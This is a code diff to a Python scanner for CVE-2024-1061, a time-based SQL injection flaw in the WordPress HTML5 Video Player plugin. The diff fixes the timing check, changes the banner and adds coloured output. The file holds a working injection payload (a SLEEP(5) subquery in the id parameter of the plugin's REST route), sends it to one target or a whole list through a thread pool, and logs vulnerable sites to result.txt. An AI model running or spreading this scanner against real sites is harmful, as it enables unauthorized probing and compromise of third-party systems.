@@ -7,27 +7,34 @@ import json
 from multiprocessing.dummy import Pool
 import requests
 import urllib3
+import time
 from rich.console import Console
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 def banner():
-    test = """
-           8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
-            Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
-             Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
-              "8aa8"      88           88,d88'      88 88  `8b   88 88             
-               `88'       88           8888"88,     88 88   `8b  88 88      88888  
-                88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
-                88        88           88     "88,  88 88     `888   `"Y88888P"   
+    test = r"""
+____________________________________________________________________________
+                                                                            
+                   _..-'(                       )`-.._                      
+                 ./'. '||\\.       (\_/)       .//||` .`\.                  
+              ./'.|'.'||||\\|..    )O O(    ..|//||||`.`|.`\.               
+           ./'..|'.|| |||||\`````` '`"'` ''''''/||||| ||.`|..`\.            
+         ./'.||'.|||| ||||||||||||.     .|||||||||||| |||||.`||.`\.         
+        /'|||'.|||||| ||||||||||||{     }|||||||||||| ||||||.`|||`\         
+       '.|||'.||||||| ||||||||||||{     }|||||||||||| |||||||.`|||.`        
+      '.||| ||||||||| |/'   ``\||``     ''||/''   `\| ||||||||| |||.`       
+      |/' \./'     `\./         \!|\   /|!/         \./'     `\./ `\|       
+      V    V         V          }' `\ /' `{          V         V    V       
+      `    `         `               V               '         '    '       
+____________________________________________________________________________
 
-                            888888888888 
-
-                                        tag: this is a WordPress Plugin HTML5 Video Player SQL注入漏洞(CVE-2024-1061)
-                                              @version: 1.0.0   @author: Y1_K1NG           
+tag: this is a WordPress Plugin HTML5 Video Player SQL注入漏洞(CVE-2024-1061)
+                    @version: 1.0.0   魔改修复版（请叫我雷锋）          
     """
-    print(test)
+    # print(test)
+    print("\033[36m{}\033[0m".format(test))
 
 
 def poc(target):
@@ -38,6 +45,7 @@ def poc(target):
     path = "/?rest_route=/h5vp/v1/view/1&id=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)--+"
     url = target + path
     headers = {
+        "Connection":"close",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "Accept": "*/*",
         "Accept-Language": "en",
@@ -51,22 +59,26 @@ def poc(target):
         # conn = http.client.HTTPConnection(target)
         # conn.request("POST", path, body.encode("utf-8"), headers)
         # response1 = conn.getresponse()
-        response1 = requests.get(url, headers=headers, files=files, verify=False, timeout=15)
+        start_time = time.time()    # 请求开始时的时间戳
+        response1 = requests.get(url, headers=headers, stream=True, verify=False, timeout=15)
         # print(response1.status_code)
+        end_time = time.time()  # 请求结束时的时间戳
 
+        response_time = end_time - start_time
+        # print(response_time)
+        if response_time > 4 and response_time < 15:
 
-        if response1_time > 4000:
+            print("\033[31m[+] {} 💖💖💖💖💖 存在sql注入！\033[0m".format(target))
 
-            print(f"[++++++] {target} 存在 sql注入")
             with open("result.txt", "a+", encoding="utf-8") as f:
                 f.write(target + "\n")
 
         else:
-            print(f"[-] {target} 未发现")
+            pass
 
     except Exception as e:
-        print(f"[*] {target} error: {str(e)}")
-
+        # print(f"[*] {target} error: {str(e)}")
+        pass
 
 def extract_host(url):
     """
@@ -87,7 +99,7 @@ def extract_host(url):
 
 def main():
     banner()
-    parser = argparse.ArgumentParser(description='任何问题+V y1k1ng1227')
+    parser = argparse.ArgumentParser(description='任何问题找星主！！！！')
     parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
     parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
     args = parser.parse_args()
